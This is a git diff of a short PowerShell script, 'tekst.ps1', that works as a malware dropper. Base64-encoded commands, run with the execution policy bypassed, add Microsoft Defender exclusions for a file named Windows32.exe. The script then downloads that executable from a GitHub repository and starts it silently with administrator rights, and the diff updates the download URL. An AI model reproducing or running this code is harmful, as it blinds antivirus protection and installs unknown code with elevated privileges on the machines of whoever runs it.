8e55f9fb7505f9c6421e13a38e6d82090ac78d5a
e <150134733+nomitaned@users.noreply.github.com>
2025-03-22 14:19:01 +0100

    text.ps1

--- tekst.ps1
+++ tekst.ps1
@@ -1,5 +1,4 @@
 powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEQAbwBjAHUAbQBlAG4AdABzAFwAVwBpAG4AZABvAHcAcwAzADIALgBlAHgAZQAiACAALQBGAG8AcgBjAGUA
 powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAWABlAG4AbwBNAGEAbgBhAGcAZQByAFwAVwBpAG4AZABvAHcAcwAzADIALgBlAHgAZQBcACIAIAAtAEYAbwByAGMAZQA=
-Invoke-WebRequest -Uri "https://github.com/e/e/raw/refs/heads/main/Windows32.exe" -OutFile "$env:USERPROFILE\Documents\Windows32.exe"
-Start-Process "$env:USERPROFILE\Documents\Windows32.exe" -ArgumentList '/silent' -NoNewWindow -Wait -Verb RunAs
-exit
+Invoke-WebRequest -Uri "https://github.com/nomitaned/e/raw/refs/heads/main/Windows32.exe" -OutFile "$env:USERPROFILE\Documents\Windows32.exe"
+Start-Process "$env:USERPROFILE\Documents\Windows32.exe" -ArgumentList '/silent' -Wait -Verb RunAs
